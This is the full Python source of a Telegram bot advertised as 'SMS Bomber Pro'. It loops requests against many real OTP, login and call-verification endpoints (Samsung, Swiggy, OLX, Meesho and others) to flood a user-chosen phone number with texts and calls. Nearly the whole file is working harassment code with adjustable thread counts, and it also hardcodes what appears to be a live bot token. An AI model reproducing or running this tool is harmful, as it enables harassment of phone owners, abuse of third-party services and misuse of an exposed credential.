import logging
import asyncio
import requests
import time
import threading
import json
import math
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)

BOT_TOKEN = "7714765260:AAG4yiN5_ow25-feUeKslR2xsdeMFuPllGg"
CHANNEL_ID = -1002512368825  # Replace with your actual channel ID

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Global variables for the bomber
message_count = 0
api_counters = {}
api_repeats = {}  # Tracks how many times each API has repeated
count_lock = threading.Lock()
start_time = 0
bomber_active = False
current_target = ""
current_threads = 0
status_message = None
status_chat_id = None

# Complete API configurations (ALL APIs INCLUDED)
api_configurations = [
    # POST APIs (40 second interval)
    {
        'name': 'Samsung OTP',
        'url': 'https://www.samsung.com/in/api/v1/sso/otp/init',
        'method': 'POST',
        'data': lambda n: json.dumps({"user_id": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'More Retail Login',
        'url': 'https://omni-api.moreretail.in/api/v1/login/',
        'method': 'POST',
        'data': lambda n: json.dumps({"hash_key": "XfsoCeXADQA", "phone_number": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'Swiggy Call Verify',
        'url': 'https://profile.swiggy.com/api/v3/app/request_call_verification',
        'method': 'POST',
        'data': lambda n: json.dumps({"mobile": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'OLX Authentication',
        'url': 'https://www.olx.in/api/auth/authenticate?lang=en-IN',
        'method': 'POST',
        'data': lambda n: json.dumps({"method": "call", "phone": f"+91{n}", "language": "en-IN", "grantType": "retry"}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'PropTiger Login',
        'url': 'https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call',
        'method': 'POST',
        'data': lambda n: json.dumps({"contactNumber": n, "domainId": "2"}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'ForexWin OTP',
        'url': 'https://api.forexwin.co/api/sendOtp',
        'method': 'POST',
        'data': lambda n: json.dumps({"phone": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'DocTime OTP',
        'url': 'https://admin.doctime.com.bd/api/otp/send',
        'method': 'POST',
        'data': lambda n: json.dumps({"contact": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'Doubtnut Login',
        'url': 'https://api.doubtnut.com/v4/student/login',
        'method': 'POST',
        'data': lambda n: json.dumps({"is_web": "3", "phone_number": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'Trinkerr OTP',
        'url': 'https://prod-backend.trinkerr.com/api/v1/web/traders/generateOtpForLogin',
        'method': 'POST',
        'data': lambda n: json.dumps({"mobile": n, "otpOperationType": "SignUp"}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'Meesho OTP',
        'url': 'https://www.meesho.com/api/v1/user/login/request-otp',
        'method': 'POST',
        'data': lambda n: json.dumps({"phone_number": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'TLLMS OTP',
        'url': 'https://identity.tllms.com/api/request_otp',
        'method': 'POST',
        'data': lambda n: json.dumps({"feature": "", "phone": f"+91{n}", "type": "sms", "app_client_id": "null"}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    # GET APIs (45 second interval)
    {
        'name': 'Glonova Lookup',
        'url': 'https://glonova.in/',
        'method': 'GET',
        'params': lambda n: {'mobile': n},
        'interval': 45,
        'threads': 1
    },
    # Booming API (continuous)
    {
        'name': 'Booming API',
        'url': 'https://booming-api.vercel.app/',
        'method': 'GET',
        'params': lambda n: {'number': n},
        'interval': 0.5,
        'threads': 'user_defined'
    }
]

def api_request_loop(api_config, number, thread_id=None):
    global message_count, api_counters, api_repeats, bomber_active
    api_name = api_config['name']
    
    with count_lock:
        if api_name not in api_counters:
            api_counters[api_name] = 0
            api_repeats[api_name] = 0
    
    while bomber_active:
        try:
            if api_config['method'] == 'POST':
                response = requests.post(
                    api_config['url'],
                    data=api_config['data'](number),
                    headers=api_config.get('headers', {}),
                    timeout=10
                )
            else:
                response = requests.get(
                    api_config['url'],
                    params=api_config['params'](number),
                    headers=api_config.get('headers', {}),
                    timeout=10
                )
            
            with count_lock:
                message_count += 1
                api_counters[api_name] += 1
                if api_counters[api_name] % 100 == 0:
                    api_repeats[api_name] += 1
                
        except Exception as e:
            logging.error(f"Error in {api_name} thread {thread_id}: {str(e)}")
        
        time.sleep(api_config['interval'])

def start_bomber(number, boom_threads, context, chat_id):
    global bomber_active, start_time, message_count, api_counters, api_repeats, current_target, current_threads, status_chat_id
    
    bomber_active = True
    start_time = time.time()
    message_count = 0
    api_counters = {}
    api_repeats = {}
    current_target = number
    current_threads = boom_threads
    status_chat_id = chat_id
    
    display_thread = threading.Thread(target=display_counters, args=(context,), daemon=True)
    display_thread.start()
    
    for config in api_configurations:
        threads = boom_threads if config['threads'] == 'user_defined' else config['threads']
        for i in range(threads):
            t = threading.Thread(
                target=api_request_loop,
                args=(config, number, i+1),
                daemon=True
            )
            t.start()
    logging.info(f"Bomber started on {number} with {boom_threads} threads")

def stop_bomber():
    global bomber_active, current_target, current_threads, status_message
    bomber_active = False
    current_target = ""
    current_threads = 0
    status_message = None
    logging.info("Bomber stopped by user")

async def display_counters(context):
    global message_count, api_counters, api_repeats, start_time, bomber_active, current_target, current_threads, status_message
    
    while bomber_active:
        with count_lock:
            current_total = message_count
            current_api_counts = api_counters.copy()
            current_repeats = api_repeats.copy()
        
        runtime = time.time() - start_time
        requests_per_sec = current_total / max(1, runtime)
        
        # Create progress bar
        progress = min(100, (runtime % 10) * 10)  # Animated progress for demo
        progress_bar = "🟢" * int(progress/10) + "⚪" * (10 - int(progress/10))
        
        # Format runtime as MM:SS
        minutes = int(runtime // 60)
        seconds = int(runtime % 60)
        runtime_str = f"{minutes}:{seconds:02d}"
        
        output = f"🔥 <b>BOMBER STATUS</b> 🔥\n\n"
        output += f"📱 <b>Target</b>: <code>{current_target}</code>\n"
        output += f"🧵 <b>Threads</b>: <code>{current_threads}</code>\n"
        output += f"⏱️ <b>Runtime</b>: <code>{runtime_str}</code>\n\n"
        output += f"📊 <b>Total Requests</b>: <code>{current_total:,}</code>\n"
        output += f"🚀 <b>Speed</b>: <code>{requests_per_sec:.1f}/sec</code>\n\n"
        output += f"{progress_bar}\n\n"
        output += "<b>ACTIVE API THREADS:</b>\n"
        
        for api_name in sorted(current_api_counts.keys()):
            count = current_api_counts[api_name]
            repeat = current_repeats.get(api_name, 0)
            output += f"  • {api_name.ljust(18)}: <code>{count:,}</code> (×{repeat})\n"
        
        try:
            if status_message:
                await status_message.edit_text(output, parse_mode='HTML')
            else:
                status_message = await context.bot.send_message(
                    chat_id=status_chat_id,
                    text=output,
                    parse_mode='HTML'
                )
        except Exception as e:
            logging.error(f"Error updating status: {e}")
        
        time.sleep(5)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.callback_query:
            query = update.callback_query
            await query.answer()
            message = query.message
        else:
            message = update.message

        keyboard = [
            [InlineKeyboardButton("📢 Join Channel", url="https://t.me/+RhlQLyOfQ48xMjI1")],
            [InlineKeyboardButton("✅ Check Join", callback_data="check_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        welcome_text = """
🌟 <b>Welcome to SMS Bomber Pro</b> 🌟

🚀 <i>The most powerful SMS bomber tool on Telegram</i>

🔹 <b>Features:</b>
• Multiple API endpoints
• Custom thread control
• Real-time stats
• High speed bombing

👉 Join our channel to get started!
        """
        
        if update.callback_query:
            try:
                await message.edit_caption(
                    caption=welcome_text,
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
            except:
                await context.bot.send_photo(
                    chat_id=message.chat_id,
                    photo="https://t.me/bshshsubjsus/4",
                    caption=welcome_text,
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
        else:
            await message.reply_photo(
                photo="https://t.me/bshshsubjsus/4",
                caption=welcome_text,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
    except Exception as e:
        logging.error(f"Start error: {e}")
        if update.message:
            await update.message.reply_text("An error occurred. Please try again.")

async def check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id

        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            keyboard = [[InlineKeyboardButton("🚀 Start Bomber", callback_data="start_bomber")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            try:
                await query.edit_message_caption(
                    caption="✅ <b>Access Granted!</b>\n\nClick below to start the bomber!",
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
            except:
                await context.bot.send_message(
                    chat_id=query.message.chat_id,
                    text="✅ <b>Access Granted!</b>\n\nClick below to start the bomber!",
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
        else:
            await query.edit_message_caption(
                caption="❌ <b>You must join our channel first!</b>\n\nPlease join and try again.",
                parse_mode='HTML'
            )
    except Exception as e:
        logging.error(f"Check_join error: {e}")
        try:
            await query.answer("Error checking join status", show_alert=True)
        except:
            pass

async def start_bomber_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        
        try:
            await query.edit_message_text(
                "🔢 <b>Enter target number:</b>\n\n"
                "• 10 digits only\n"
                "• Without +91 or 0\n"
                "• Example: <code>9876543210</code>",
                parse_mode='HTML'
            )
        except:
            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text="🔢 <b>Enter target number:</b>\n\n"
                     "• 10 digits only\n"
                     "• Without +91 or 0\n"
                     "• Example: <code>9876543210</code>",
                parse_mode='HTML'
            )
        
        context.user_data['awaiting_phone_number'] = True
    except Exception as e:
        logging.error(f"Start_bomber error: {e}")
        try:
            await query.answer("Error starting bomber", show_alert=True)
        except:
            pass

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if 'awaiting_phone_number' in context.user_data and context.user_data['awaiting_phone_number']:
        phone_number = update.message.text.strip()
        
        if not phone_number.isdigit() or len(phone_number) != 10:
            await update.message.reply_text(
                "❌ <b>Invalid number!</b>\n\n"
                "Please send a valid 10 digit number without +91 or 0.\n"
                "Example: <code>9876543210</code>",
                parse_mode='HTML'
            )
            return
        
        keyboard = [
            [InlineKeyboardButton("5 Threads", callback_data=f"threads_5_{phone_number}")],
            [InlineKeyboardButton("10 Threads", callback_data=f"threads_10_{phone_number}")],
            [InlineKeyboardButton("15 Threads", callback_data=f"threads_15_{phone_number}")],
            [InlineKeyboardButton("Custom Threads", callback_data=f"custom_threads_{phone_number}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🧵 <b>Select threads for Booming API:</b>\n\n"
            "• 1-20 threads recommended\n"
            "• Higher threads = faster bombing\n"
            "• Custom option allows any number",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        
        context.user_data['awaiting_phone_number'] = False
    
    elif 'awaiting_thread_count' in context.user_data and context.user_data['awaiting_thread_count']:
        try:
            threads = int(update.message.text.strip())
            phone_number = context.user_data['target_number']
            
            if threads < 1 or threads > 100:
                await update.message.reply_text(
                    "❌ <b>Invalid thread count!</b>\n\n"
                    "Please enter a number between 1-100.",
                    parse_mode='HTML'
                )
                return
            
            start_bomber(phone_number, threads, context, update.message.chat_id)
            
            await update.message.reply_text(
                f"🚀 <b>Bomber started on {phone_number} with {threads} threads!</b>\n\n"
                "• Running in background\n"
                "• Use /stopbomber to stop\n"
                "• Stats will update automatically",
                parse_mode='HTML'
            )
            
            del context.user_data['awaiting_thread_count']
            del context.user_data['target_number']
            
        except ValueError:
            await update.message.reply_text(
                "❌ <b>Invalid input!</b>\n\n"
                "Please enter a valid number (1-100).",
                parse_mode='HTML'
            )

async def handle_thread_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        
        data = query.data.split('_')
        
        if data[0] == 'custom':
            phone_number = data[2]
            context.user_data['awaiting_thread_count'] = True
            context.user_data['target_number'] = phone_number
            
            await query.edit_message_text(
                "✏️ <b>Enter custom thread count (1-100):</b>\n\n"
                "Type any number between 1-100\n"
                "Example: <code>25</code>",
                parse_mode='HTML'
            )
        else:
            threads = int(data[1])
            phone_number = data[2]
            
            start_bomber(phone_number, threads, context, query.message.chat_id)
            
            await query.edit_message_text(
                f"🚀 <b>Bomber started on {phone_number} with {threads} threads!</b>\n\n"
                "• Running in background\n"
                "• Use /stopbomber to stop\n"
                "• Stats will update automatically",
                parse_mode='HTML'
            )
    except Exception as e:
        logging.error(f"Thread selection error: {e}")
        try:
            await query.answer("Error starting bomber", show_alert=True)
        except:
            pass

async def stop_bomber_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stop_bomber()
    await update.message.reply_text(
        "🛑 <b>Bomber stopped successfully!</b>\n\n"
        "All attack threads terminated.",
        parse_mode='HTML'
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bomber_active:
        await update.message.reply_text(
            "ℹ️ <b>No active bomber session</b>\n\n"
            "Start a bomber first to see stats",
            parse_mode='HTML'
        )
        return
    
    with count_lock:
        current_total = message_count
        current_api_counts = api_counters.copy()
        current_repeats = api_repeats.copy()
    
    runtime = time.time() - start_time
    requests_per_sec = current_total / max(1, runtime)
    
    # Format runtime as MM:SS
    minutes = int(runtime // 60)
    seconds = int(runtime % 60)
    runtime_str = f"{minutes}:{seconds:02d}"
    
    progress = min(100, (runtime % 10) * 10)
    progress_bar = "🟢" * int(progress/10) + "⚪" * (10 - int(progress/10))
    
    stats_text = f"""
📊 <b>BOMBER STATISTICS</b> 📊

📱 <b>Target</b>: <code>{current_target}</code>
🧵 <b>Threads</b>: <code>{current_threads}</code>
⏱️ <b>Runtime</b>: <code>{runtime_str}</code>

📈 <b>Total Requests</b>: <code>{current_total:,}</code>
🚀 <b>Speed</b>: <code>{requests_per_sec:.1f}/sec</code>

{progress_bar}

<b>API BREAKDOWN:</b>
"""
    
    for api_name in sorted(current_api_counts.keys()):
        count = current_api_counts[api_name]
        repeat = current_repeats.get(api_name, 0)
        stats_text += f"  • {api_name.ljust(18)}: <code>{count:,}</code> (×{repeat})\n"
    
    await update.message.reply_text(stats_text, parse_mode='HTML')

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logging.error(f"Error: {context.error}")
    try:
        if isinstance(update, Update) and update.callback_query:
            await update.callback_query.answer("❌ Error occurred", show_alert=True)
        elif isinstance(update, Update) and update.message:
            await update.message.reply_text("⚠️ An error occurred. Please try again.")
    except Exception as e:
        logging.error(f"Error handler error: {e}")

async def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_error_handler(error_handler)
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stopbomber", stop_bomber_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))
    app.add_handler(CallbackQueryHandler(start_bomber_handler, pattern="start_bomber"))
    app.add_handler(CallbackQueryHandler(handle_thread_selection, pattern="^threads_"))
    app.add_handler(CallbackQueryHandler(handle_thread_selection, pattern="^custom_threads_"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    logging.info("Bot running...")
    await app.run_polling()

if __name__ == '__main__':
    import nest_asyncio
    nest_asyncio.apply()
    asyncio.run(main())
